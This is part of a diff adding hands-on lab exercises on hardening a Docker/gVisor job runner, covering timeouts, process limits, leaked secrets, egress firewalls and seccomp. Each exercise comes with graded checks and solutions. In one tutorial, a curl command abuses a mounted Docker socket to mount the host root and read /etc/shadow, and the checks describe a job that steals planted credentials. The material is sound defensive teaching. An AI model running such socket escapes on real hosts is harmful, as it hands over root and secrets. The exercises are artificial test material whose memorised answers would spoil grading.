+    `timeout` first sends `SIGTERM`. The client passes it on to the container (`--sig-proxy`, on by default), and a job that **ignores SIGTERM** shrugs it off, so the client just keeps waiting. With `-k`, `timeout` then `SIGKILL`s the **client**, and nothing passes that on. A job that wants to keep running only has to ignore one signal.
+
+    The fix: let the **daemon** do the waiting and the killing.
+
+    ```bash
+    cid=$(docker run -d --name "job-$$" IMG python3 /job/main.py)   # start, get the id
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT                 # whatever happens, remove it
+    if rc=$(timeout 30 docker wait "$cid"); then                    # docker wait prints the exit code
+        docker logs "$cid"; exit "$rc"
+    fi
+    docker logs "$cid"; echo "timed out" >&2; exit 124             # 124 = timeout's own convention
+    ```
+
+    `docker wait` blocks until the container stops and prints its exit code. If *it* is killed by `timeout`, nothing is lost: the container is still there, and `docker rm -f` (`SIGKILL` from the daemon, then remove) ends it for sure. Don't use `--rm` here: the container may be gone before you read its exit code or logs.
+
+    ### Common mistakes
+
+    - `timeout ... docker run`: limits the client, not the job.
+    - `docker stop`: sends `SIGTERM` first and waits 10 s by default. Use `docker rm -f` (or `docker kill`) for code you don't trust.
+    - No `trap`: if the runner itself is interrupted, the job lives on.
+    - Losing the exit code: `docker wait`'s output **is** the job's exit code; pass it on.
+
+    ### Check your work
+
+    A job that never ends makes the runner return 124 after about 20 s, and `docker ps` shows nothing left.
+  scenario: |
+    **`/lab/run-job.sh`** promises a **20-second** limit per job, using
+    `timeout`. Yet this morning `docker ps` showed jobs that had been running
+    for days, and the runners that started them had long since exited.
+
+    Fix the runner so that:
+
+    - a job that runs past **20 seconds** is stopped and **removed**, even if
+      it ignores signals, and the runner exits with **124** within about
+      25 seconds of starting;
+    - otherwise the runner exits with the **job's own exit code**, and still
+      shows the job's output;
+    - **no job container is left behind**, whatever happened.
+
+    Keep every sandbox option the runner already has.
+  hints:
+    - "Run a job whose `main.py` is `import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN)` followed by an endless loop, then look at `docker ps`."
+    - "Start the container with `docker run -d` (no `--rm`), wait for it with `timeout 20 docker wait`, remove it with `docker rm -f`."
+    - "`trap 'docker rm -f \"$cid\" >/dev/null 2>&1' EXIT` cleans up on every way out of the script."
+  solution: |
+    ```bash
+    #!/bin/bash
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    timeout -k 2 20 docker run --rm --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py
+    EOF
+  check: |
+    docker ps -aq --filter ancestor=kl-job:1 | xargs -r docker rm -f >/dev/null  # earlier runs' leftovers
+    gv_run forever 60
+    check_eq "a job that never ends: the runner exits 124" "$GV_RC" 124
+    check "within 25 seconds" '[ "$GV_SECS" -le 25 ]'
+    sleep 3
+    check_eq "no job container is left running" "$(gv_jobs_running)" 0
+    b1=$(cat "$GV_OUT/beat" 2>/dev/null); sleep 2; b2=$(cat "$GV_OUT/beat" 2>/dev/null)
+    check "the job really stopped (its heartbeat file no longer changes)" '[ -n "$b1" ] && [ "$b1" = "$b2" ]'
+    check_eq "no stopped job container is left either" "$(docker ps -aq --filter ancestor=kl-job:1 | wc -l)" 0
+    gv_job exit3 <<'PY'
+    import sys
+    print("half the rows were invalid")
+    sys.exit(3)
+    PY
+    gv_run exit3
+    check_eq "a job that exits 3: the runner exits 3" "$GV_RC" 3
+    check "and shows the job's output" 'grep -q "half the rows were invalid" "$GV_LOG"'
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "with the right answer, as uid 65534, under gVisor" \
+      "$(gj result.json '"\(.sum) \(.uid) \(.kernel | test("gvisor"))"')" "$(gv_sum) 65534 true"
+    check_eq "nothing is left behind" "$(docker ps -aq --filter ancestor=kl-job:1 | wc -l)" 0
+  solve: |
+    cat > /lab/run-job.sh <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  deliverables: [run-job.sh]
+
+- id: sec-100
+  title: The fork-bomb guard that broke every job
+  difficulty: 3
+  kind: fix
+  tags: [gvisor, runsc, docker, pids, ulimit, fork-bomb, debugging]
+  tutorial: |
+    **What you're learning.** Limiting how many processes a job can start, why a tight `--pids-limit` kills gVisor sandboxes, and how to read runsc's own logs when a sandbox dies.
+
+    ### The idea
+
+    A **fork bomb** starts processes until the system runs out of them, and then nothing on the host can start a process: no shell, no `sshd` login, no cron job. Two different counters can stop one:
+
+    | limit | where it counts | set with |
+    |---|---|---|
+    | the **pids cgroup** | every host task (process or thread) in the container's cgroup | `--pids-limit N` |
+    | **`RLIMIT_NPROC`** | processes of one uid, counted by the kernel the job talks to | `--ulimit nproc=N` |
+
+    Under `runc` they count the same processes. Under **gVisor they don't**. The job's processes live inside the Sentry, but the **cgroup counts the Sentry's own host threads**, and on gVisor's `systrap` platform every guest address space needs host helper threads too. Measured on this VM:
+
+    ```
+    sandbox, idle job         ~30 host pids
+    + each guest process      ~2 more
+    ```
+
+    So `--pids-limit 48` leaves room for only about 9 guest processes. When the Sentry can't create a thread it **panics**, and the whole sandbox dies with no useful error from the job's point of view. Meanwhile `--ulimit nproc` is enforced by the Sentry itself, **even for root**, and a job that hits it just gets `EAGAIN` from `fork()`.
+
+    The right pair for gVisor: a **generous pids cgroup** as the host's backstop (a few hundred), and **`--ulimit nproc`** for the job's real budget. (Under `runc`, `nproc` counts all of that uid's processes **on the whole host**, across containers. Another reason to give jobs their own uid.)
+
+    ### Reading runsc's logs
+
+    A runtime registered with `--debug --debug-log=/var/log/runsc/%ID%/` writes one folder per container (`%ID%` is its full id): `*.boot.txt` is the Sentry, `*.gofer.txt` the file proxy, `*.create.txt`/`*.start.txt` the runtime commands.
+
+    ```bash
+    sudo ls /var/log/runsc/                                   # one folder per container id
+    sudo grep -h '^panic:' /var/log/runsc/*/runsc.log.*.boot.txt     # (plain "panic" also matches config lines)
+    #   panic: Unknown syscall 220 error: createStub: failed to get clone
+    cat /sys/fs/cgroup/system.slice/docker-ID.scope/pids.current    # host tasks of a running container
+    ```
+
+    ### Common mistakes
+
+    - Copying a `--pids-limit` that worked under `runc` to `runsc`.
+    - Removing `--pids-limit` altogether to make the error go away: the host loses its backstop.
+    - `--ulimit nproc` far above what the memory limit can hold: every gVisor process costs a few MiB of the cgroup's memory.
+
+    ### Check your work
+
+    A job with a 16-worker `multiprocessing.Pool` finishes; a fork bomb gets about 32 processes, its `fork()` fails, and the runner returns.
+  scenario: |
+    After a fork bomb took the CI host down, someone added **`--pids-limit 48`**
+    to **`/lab/run-job.sh`**. Now every job that uses `multiprocessing`
+    dies at once, with no error of its own. The `runsc` runtime on this host
+    writes its debug logs to **`/var/log/runsc/`** (`sudo` to read them).
+
+    Find out why, then fix the runner so that:
+
+    - a job using **16 worker processes** works;
+    - a job can run **at most 32 processes**: a fork bomb's `fork()` fails
+      and the runner returns normally;
+    - the host still has a **pids cgroup limit** as a backstop;
+    - nothing else about the sandbox changes.
+  hints:
+    - "Run a job with `from multiprocessing import Pool` and 16 workers, then look at the newest folder in `/var/log/runsc/`."
+    - "`sudo grep -h '^panic:' /var/log/runsc/*/runsc.log.*.boot.txt`: the Sentry couldn't create a host thread (syscall 220 is `clone` on arm64)."
+    - "`--pids-limit 512 --ulimit nproc=32`"
+  solution: |
+    The pids cgroup counts gVisor's own host threads (about 30, plus about 2
+    per guest process), so 48 is exhausted by 9 processes and the Sentry panics
+    (`panic: ... failed to get clone`). Keep a generous cgroup limit and
+    let the Sentry count the job's processes:
+
+    ```bash
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+    ```
+  setup: |
+    gv_ready
+    gv_runtime runsc --debug --debug-log=/var/log/runsc/%ID%/
+    on_reset 'rm -rf /var/log/runsc'
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 48 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  check: |
+    gv_run pool 60
+    check_eq "a job with 16 worker processes succeeds" "$GV_RC" 0
+    check_eq "and finishes its work" "$(gj pool.json .workers)" 16
+    gv_run forkbomb 60
+    check "a fork bomb doesn't hang the runner" '[ "$GV_RC" != 124 ]'
+    n=$(gj fork.json .forked)
+    check "the fork bomb got no more than 32 processes" '[ -n "$n" ] && [ "$n" != null ] && [ "$n" -le 32 ]'
+    check "its fork() failed (the job saw the limit, the sandbox didn't crash)" '[ -n "$(gj fork.json ".error // empty")" ]'
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "with the right answer, as uid 65534, under gVisor" \
+      "$(gj result.json '"\(.sum) \(.uid) \(.kernel | test("gvisor"))"')" "$(gv_sum) 65534 true"
+    gv_inspect
+    pl=$(gi '.HostConfig.PidsLimit // 0')
+    check "the host keeps a pids cgroup limit as a backstop" '[ "$pl" -gt 0 ]'
+    check_eq "memory is still capped at 256 MiB" "$(gi .HostConfig.Memory)" 268435456
+    check_eq "still no network" "$(gi .HostConfig.NetworkMode)" none
+  solve: |
+    sed -i 's/--pids-limit 48/--pids-limit 512 --ulimit nproc=32/' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+- id: sec-101
+  title: The shortcut that handed over the host
+  difficulty: 3
+  kind: fix
+  tags: [gvisor, docker, docker-socket, secrets, mounts, environment, incident]
+  tutorial: |
+    **What you're learning.** The three ways a sandbox leaks secrets from outside it (the environment, mounts and the Docker socket), and why the Docker socket undoes all the others.
+
+    ### The idea
+
+    A sandbox is only as tight as **what you hand to it**. Everything below crosses the boundary on purpose, so no runtime can stop it:
+
+    - **Environment variables.** `--env-file ci.env` or `-e TOKEN` gives every job your tokens. `os.environ` is one line of Python.
+    - **Mounts.** `-v /lab:/work` "so jobs can read their config" also hands over every other file in `/lab`: keys, `.env` files, other jobs' data.
+    - **The Docker socket.** `-v /var/run/docker.sock:/var/run/docker.sock` lets the job ask the daemon to start a *new* container: privileged, with the host's `/` mounted, under `runc`. That's root on the host with three HTTP calls:
+
+    ```bash
+    # from inside a job that has the socket
+    curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' \
+      -d '{"Image":"alpine:3.22","Cmd":["cat","/host/etc/shadow"],"HostConfig":{"Binds":["/:/host"]}}' \
+      http://localhost/containers/create
+    ```
+
+    Under gVisor the socket bind fails by default (runsc refuses to connect to host Unix sockets unless `--host-uds` allows it). That's exactly why people switch such jobs to `runc` "to make it work", and then the job owns the host.
+
+    ### What to hand over instead
+
+    | the job needs | give it |
+    |---|---|
+    | its input | its own folder, `:ro` |
+    | somewhere for results | one output folder |
+    | to know who it is | one variable, `-e JOB_ID=…` |
+    | to build images | a separate build service (BuildKit, a CI step). **Never** the socket |
+
+    `docker inspect -f '{{json .HostConfig.Binds}} {{json .Config.Env}}' NAME` shows exactly what a container was given.
+
+    ### Common mistakes
+
+    - `--env-file` with a file that holds more than the job needs.
+    - Mounting a parent folder (`/lab`, `$HOME`) instead of the one folder the job uses.
+    - Thinking `:ro` makes a secret safe: reading it is the attack.
+
+    ### Check your work
+
+    A job that dumps its environment, walks every file it can see and tries the Docker socket finds no secrets.
+  scenario: |
+    **Incident.** A job uploaded `/lab/ci.env`, the team's deploy key and a
+    file only root can read on this host, `/etc/kl-host-secret`. To let one
+    team's jobs build images, someone changed **`/lab/run-job.sh`**: jobs got
+    the **Docker socket**, the whole **`/lab`** workspace at `/work`, the
+    **`ci.env`** environment, `runc` instead of gVisor (the socket "didn't
+    work" in gVisor), and root (the socket "needs root").
+
+    Image builds moved to CI. Make the runner a sandbox again:
+
+    - jobs run under **gVisor**, as **uid 65534**, with **no capabilities** and
+      **no-new-privileges**;
+    - a job sees **only its own folder** (read-only, at `/job`) and **`/out`**;
+    - the **only** variable the runner passes is **`JOB_ID`**;
+    - **no Docker socket**.
+
+    Keep the limits, the time limit and the read-only root.
+  hints:
+    - "`docker inspect` a running job: look at `HostConfig.Binds`, `Config.Env` and `HostConfig.Runtime`."
+    - "Delete the socket mount, the `/lab` mount and `--env-file`; put back `--runtime` runsc and the three privilege options from sec-097."
+  solution: |
+    ```bash
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    ```
+    The secrets that were exposed must be rotated as well: a fixed runner
+    doesn't un-leak them.
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    tok=ghp_$(openssl rand -hex 18); aws=$(openssl rand -base64 30 | tr -d '/+='); key=$(openssl rand -hex 24); host=HOST-SECRET-$(openssl rand -hex 8)
+    printf '%s\n' "$tok" "$aws" "$key" "$host" >"$KL_STATE/secrets"
+    lab_file /lab/ci.env 0600 <<EOF
+    GITHUB_TOKEN=$tok
+    AWS_ACCESS_KEY_ID=AKIAKLCI0000000000
+    AWS_SECRET_ACCESS_KEY=$aws
+    EOF
+    lab_file /lab/.ssh/deploy_key 0600 <<EOF
+    -----BEGIN OPENSSH PRIVATE KEY-----
+    $key
+    -----END OPENSSH PRIVATE KEY-----
+    EOF
+    chmod 700 /lab/.ssh
+    install -m 600 /dev/null /etc/kl-host-secret
+    echo "$host" >/etc/kl-host-secret
+    on_reset 'rm -f /etc/kl-host-secret'
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    # 2026-11-02: image-building jobs need the Docker socket; it doesn't work under
+    # gVisor and needs root. They also need the CI config (/lab) and credentials.
+    cid=$(docker run -d --runtime runc --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v /lab:/work:ro -v "$job":/job:ro -v "$out":/out \
+      -v /var/run/docker.sock:/var/run/docker.sock \
+      --env-file /lab/ci.env -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  check: |
+    docker ps -aq --filter label=kl.pwn | xargs -r docker rm -f >/dev/null
+    gv_run loot 60
+    check "the job ran and wrote its loot file" '[ -s "$GV_OUT/loot.txt" ]'
+    i=0
+    for what in "the GitHub token" "the AWS secret key" "the deploy key" "the host's root-only secret"; do
+      i=$((i + 1)); s=$(sed -n ${i}p "$KL_STATE/secrets")
+      check_not "the job couldn't get $what" 'grep -qF -- "$s" "$GV_OUT/loot.txt"'
+    done
+    check_not "the job couldn't use the Docker socket" 'grep -q "^docker ESCAPED" "$GV_OUT/loot.txt"'
+    check_eq "the job started no containers of its own" "$(docker ps -aq --filter label=kl.pwn | wc -l)" 0
+    gv_run normal
+    check_eq "a normal job still succeeds" "$GV_RC" 0
+    check_eq "with the right answer, as uid 65534, under gVisor" \
+      "$(gj result.json '"\(.sum) \(.uid) \(.kernel | test("gvisor"))"')" "$(gv_sum) 65534 true"
+    check_eq "it gets its JOB_ID" "$(gj result.json .job_id)" "$GV_JOB"
+    check_eq "and no other variables from the runner" \
+      "$(gj result.json '[.env[] | select(IN("PATH","HOSTNAME","HOME","LANG","TERM","GPG_KEY","PYTHON_VERSION","PYTHON_SHA256","JOB_ID") | not)] | join(",")')" ""
+    check_eq "with no capabilities" "$(gj result.json .cap_eff)" 0000000000000000
+    gv_inspect
+    check_eq "the job sees exactly two mounts: /job read-only and /out" \
+      "$(gi '[.Mounts[] | "\(.Destination):\(.RW)"] | sort | join(" ")')" "/job:false /out:true"
+    check "no-new-privileges is set" 'gi ".HostConfig.SecurityOpt[]?" | grep -qE "^no-new-privileges(:true|=true)?$"'
+    check_eq "the root filesystem is still read-only" "$(gi .HostConfig.ReadonlyRootfs)" true
+    check_eq "memory is still capped" "$(gi .HostConfig.Memory)" 268435456
+  solve: |
+    cat > /lab/run-job.sh <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  deliverables: [run-job.sh]
+
+- id: sec-102
+  title: An egress allow-list for the sandbox
+  difficulty: 3
+  kind: build
+  tags: [gvisor, docker, nftables, egress, firewall, network]
+  tutorial: |
+    **What you're learning.** Letting sandboxed jobs reach exactly one service (a package mirror) and nothing else, with a Docker network of their own and an nftables table.
+
+    ### The idea
+
+    `--network none` is perfect until a job legitimately needs something, usually a **package mirror**. Docker's networks then let the job go anywhere the host can: the internet, the internal network, the metadata service. What you want is an **allow-list**: from the jobs' network, only `mirror:port`; nothing to the host itself.
+
+    Give the jobs **their own bridge** with a fixed interface name, so firewall rules can name it:
+
+    ```bash
+    docker network create -o com.docker.network.bridge.name=jobs0 --subnet 172.29.0.0/24 jobs
+    ip -br addr show jobs0               # jobs0  UP  172.29.0.1/24
+    ```
+
+    Then an **nftables** table of your own. Traffic from the jobs to anywhere *else* passes the host's **forward** hook; traffic to the host itself (its sshd, a service on the bridge's gateway address, a metadata service on a host address) passes the **input** hook. Block both:
+
+    ```
+    table inet jobfw {
+      chain out {
+        type filter hook forward priority -10; policy accept;
+        iifname "jobs0" ip daddr 192.0.2.50 tcp dport 3128 accept
+        iifname "jobs0" drop
+      }
+      chain to_host {
+        type filter hook input priority -10; policy accept;
+        iifname "jobs0" drop
+      }
+    }
+    ```
+
+    ```bash
+    sudo nft -f jobfw.nft               # load it (add a "flush table inet jobfw" line first to reload)
+    sudo nft list table inet jobfw
+    sudo nft list ruleset | grep -c jobs0
+    ```
+
+    How this fits with Docker's own rules: in nftables a packet must be **accepted by every base chain** on a hook, and a `drop` anywhere is final. So your table sits beside Docker's iptables rules without editing them, and priority `-10` runs it first. Replies to the mirror's answers come in on the mirror's side (not `iifname "jobs0"`), so they pass.
+
+    **Two gVisor details.** Docker's embedded DNS (`127.0.0.11`) doesn't answer inside runsc's own network stack, so use **IP addresses** (or `--dns` to a resolver you allow). And containers on the same bridge reach each other directly, without passing the forward hook. To keep jobs apart, also create the network with `-o com.docker.network.bridge.enable_icc=false`.
+
+    ### Common mistakes
+
+    - Only a forward rule: the job can still reach every service on the host through the gateway address.
+    - Matching on the subnet and forgetting the gateway is inside it: match the **interface**.
+    - `nft flush ruleset`: that deletes Docker's rules as well.
+    - nftables syntax: put a newline (or `;`) before a chain's closing `}`, and avoid reserved words such as `fwd` as chain names.
+
+    ### Check your work
+
+    From a job: the mirror answers; `10.99.0.20`, `169.254.169.254`, the gateway's port 22 and `1.1.1.1` time out.
+  scenario: |
+    Jobs run with no network (`/lab/run-job.sh`), and now some must install
+    packages from the company's **package mirror at `10.99.0.10:8080`**
+    (`http://10.99.0.10:8080/simple/kl-tools/`). That's the **only** thing
+    they may reach.
+
+    1. Create a Docker network named **`sandbox`** for the jobs.
+    2. Add an nftables table **`inet sandbox`** so that traffic from that
+       network reaches **only TCP 10.99.0.10:8080**: nothing else on the
+       internal network (`10.99.0.20` is an attacker's server), not the
+       internet, not the metadata service at `169.254.169.254`, and **nothing
+       on this host itself**.
+    3. Run jobs on the **`sandbox`** network.
+
+    Everything else about the runner stays as it is.
+  hints:
+    - "`docker network create -o com.docker.network.bridge.name=sbx0 sandbox`: a fixed bridge name your rules can match."
+    - "Two chains: `hook forward` (to other hosts) and `hook input` (to this host), both matching `iifname \"sbx0\"`."
+    - "In the runner, `--network none` becomes `--network sandbox`."
+  solution: |
+    ```bash
+    docker network create -o com.docker.network.bridge.name=sbx0 \
+      -o com.docker.network.bridge.enable_icc=false --subnet 172.31.0.0/24 sandbox
+    sudo nft -f - <<'NFT'
+    table inet sandbox {
+      chain egress {
+        type filter hook forward priority -10; policy accept;
+        iifname "sbx0" ip daddr 10.99.0.10 tcp dport 8080 accept
+        iifname "sbx0" drop
+      }
+      chain to_host {
+        type filter hook input priority -10; policy accept;
+        iifname "sbx0" drop
+      }
+    }
+    NFT
+    sed -i 's/--network none/--network sandbox/' /lab/run-job.sh
+    ```
+    The rules are gone after a reboot: put them in `/etc/nftables.conf` (and
+    enable `nftables.service`) on a real host.
+  setup: |
+    gv_ready
+    gv_runtime runsc
+    gv_outside
+    on_reset 'nft delete table inet sandbox 2>/dev/null'
+    lab_file /lab/run-job.sh 0755 <<'EOF'
+    #!/bin/bash
+    # run-job.sh JOBDIR OUTDIR - run an untrusted job (JOBDIR/main.py) in a sandbox.
+    # The job reads its folder at /job and writes its results to OUTDIR at /out.
+    # The exit code is the job's. Jobs get 20 seconds.
+    set -u
+    job=$(realpath "$1") out=$(realpath "$2")
+    limit=20
+    cid=$(docker run -d --runtime "${RUNTIME:-runsc}" --network none \
+      --read-only --tmpfs /tmp:size=64m \
+      --user 65534:65534 --cap-drop ALL --security-opt no-new-privileges \
+      --memory 256m --memory-swap 256m --cpus 1 --pids-limit 512 --ulimit nproc=32 \
+      -v "$job":/job:ro -v "$out":/out \
+      -e JOB_ID="$(basename "$job")" \
+      kl-job:1 python3 /job/main.py) || exit 125
+    trap 'docker rm -f "$cid" >/dev/null 2>&1' EXIT
+    if rc=$(timeout "$limit" docker wait "$cid"); then
+      docker logs "$cid"
+      exit "$rc"
+    fi
+    docker logs "$cid"
+    echo "run-job: $(basename "$job") ran out of time (${limit}s)" >&2
+    exit 124
+    EOF
+  check: |
+    gv_job fetch <<'PY'
+    import urllib.request
+    url = "http://10.99.0.10:8080/packages/kl-tools-1.4.2.txt"
+    open("/out/pkg.txt", "w").write(urllib.request.urlopen(url, timeout=5).read().decode())
+    print("installed kl-tools")
+    PY
+    gv_run fetch
+    check_eq "a job can download from the mirror" "$GV_RC" 0
+    check "and gets the real package" 'grep -qF "$(gv_token mirror)" "$GV_OUT/pkg.txt"'
+    gv_run net
+    check_match "the mirror is reachable" "$(gj net.json .mirror)" '^open'
+    check_match "10.99.0.20 is not" "$(gj net.json .exfil)" '^blocked'
+    check_eq "10.99.0.20 received nothing" "$(gv_hits exfil)" 0
+    check_match "the metadata service is not" "$(gj net.json .meta)" '^blocked'
+    check_eq "the metadata service received nothing" "$(gv_hits meta)" 0
+    check_match "the internet is not" "$(gj net.json .internet)" '^blocked'
+    check_match "this host is not (its port 22 on the gateway)" "$(gj net.json .host_ssh)" '^blocked'
+    check "nftables has a table inet sandbox" 'nft list table inet sandbox'
+    gv_inspect
+    check_eq "jobs run on the sandbox network" "$(gi .HostConfig.NetworkMode)" sandbox
+    check_eq "under gVisor" "$(gi .HostConfig.Runtime)" runsc
+    check_eq "as uid 65534" "$(gi .Config.User)" 65534:65534
+  solve: |
+    docker network create -o com.docker.network.bridge.name=sbx0 \
+      -o com.docker.network.bridge.enable_icc=false --subnet 172.31.0.0/24 sandbox
+    sudo nft -f - <<'NFT'
+    table inet sandbox {
+      chain egress {
+        type filter hook forward priority -10; policy accept;
+        iifname "sbx0" ip daddr 10.99.0.10 tcp dport 8080 accept
+        iifname "sbx0" drop
+      }
+      chain to_host {
+        type filter hook input priority -10; policy accept;
+        iifname "sbx0" drop
+      }
+    }
+    NFT
+    sed -i 's/--network none/--network sandbox/' /lab/run-job.sh
+  deliverables: [run-job.sh]
+
+- id: sec-103
+  title: The seccomp profile that did nothing
+  difficulty: 3
+  kind: fix
+  tags: [gvisor, runsc, seccomp, docker, syscalls, defense-in-depth]
+  tutorial: |
+    **What you're learning.** How seccomp profiles work with Docker, why runsc ignores them unless you ask, and how to turn them on.
+
+    ### The idea
+
+    **seccomp** filters system calls: a profile lists calls and what happens when a process makes them (`SCMP_ACT_ERRNO` returns an error, `SCMP_ACT_KILL_PROCESS` kills it). Docker applies its default profile to every `runc` container, and `--security-opt seccomp=FILE` replaces it:
+
+    ```json
+    {"defaultAction": "SCMP_ACT_ALLOW",
+     "syscalls": [{"names": ["ptrace", "unshare"], "action": "SCMP_ACT_ERRNO", "errnoRet": 1}]}
+    ```
+
+    gVisor already stands between the job and the host, and the **Sentry itself** runs under a tight seccomp filter on the host. So by default **runsc ignores the container's profile**, and it does so **silently**: `docker inspect` shows the profile, `docker run` accepts it, and every listed call still works inside the sandbox. You find out only by testing.
+
+    runsc's **`--oci-seccomp`** flag makes the Sentry enforce the container's profile as well, as a second layer on calls gVisor implements (`ptrace` and user namespaces among them):
+
+    ```bash
+    sudo runsc install --runtime runsc-strict -- --oci-seccomp    # a second runtime entry with the flag
+    # or: add "runtimeArgs": ["--oci-seccomp"] to the "runsc" entry in /etc/docker/daemon.json
+    sudo systemctl restart docker
+    docker run --rm --runtime runsc-strict --security-opt seccomp=profile.json IMG ...
+    ```
+
+    To test, call the system calls yourself and look at the error. In Python, `ctypes` reaches any call by number (`libc.syscall(nr, ...)`); errno 1 is `EPERM`. The numbers differ per architecture (`ptrace` is 117 on arm64, 101 on x86-64); `ausyscall --dump` or the kernel's `unistd.h` list them.
+
+    ### Common mistakes
+
+    - Believing a profile is enforced because `docker inspect` lists it.
+    - `"defaultAction": "SCMP_ACT_ALLOW"` profiles under `runc`: they **replace** Docker's much longer default deny-list. Start from Docker's default profile there.
+    - Testing a call with arguments that fail anyway (`unshare(0)` is a no-op that always works): test what an attacker would actually call.
+
+    ### Check your work
+
+    A job that calls every syscall in the profile gets `EPERM` for each one, and still runs under gVisor.
+  scenario: |
